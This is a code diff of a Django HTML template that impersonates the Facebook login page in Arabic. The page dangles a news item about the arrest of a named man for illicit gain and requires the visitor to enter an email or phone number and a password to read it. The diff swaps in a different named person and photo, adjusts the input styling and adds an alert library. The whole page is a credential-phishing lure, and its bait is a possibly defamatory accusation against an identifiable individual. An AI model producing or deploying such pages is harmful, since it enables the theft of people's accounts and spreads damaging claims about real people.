@@ -14,6 +14,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@100..900&family=Tajawal:wght@200;300;400;500;700;800;900&display=swap" rel="stylesheet">
+
     <title>Facebook - Log In or sign up</title>
 
     <style>
@@ -43,7 +44,7 @@
 
                         
                         <p class="text-danger mt-0 mb-0" style="font-size:16px">
-                            القبض على المدعو يحيى خفاجى بتهمة الكسب غير المشروع
+                            القبض على المدعو عمار مختار بتهمة الكسب غير المشروع
                         </p>
 
                          <hr class="mt-0 mb-0">
@@ -53,7 +54,7 @@
                             لمشاهدة هذا الخبر قم بتسجيل الدخول
                         </p>
 
-                        <img class="rounded-4 mb-3" width="70%" height="40%" src="{% static "../static/img/yehia.jpg" %}">
+                        <img class="rounded-4 mb-3" width="70%" height="40%" src="{% static "../static/img/ammar.jpg" %}">
                     </div>
 
                 </div>
@@ -70,13 +71,13 @@
                             {% csrf_token %}
                             <div class="mb-3">
 
-                                <input autofocus type="text" class="form-control form-control-lg text-start" name="email"
+                                <input autofocus type="text" class="form-control form-control-lg text-center" name="email"
                                     placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                             </div>
 
                             <div class="mb-3">
 
-                                <input type="password" class="form-control form-control-lg holder text-start" placeholder="كلمة السر" name="password"
+                                <input type="password" class="form-control form-control-lg holder text-center" placeholder="كلمة السر" name="password"
                                     required>
                             </div>
 
@@ -117,6 +118,8 @@
     </div>
     <script src="{% static "../static/js/theme.js" %}"></script>
     <script src="{% static "../static/js/bootstrap.min.js" %}"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
 </body>
 
 </html>
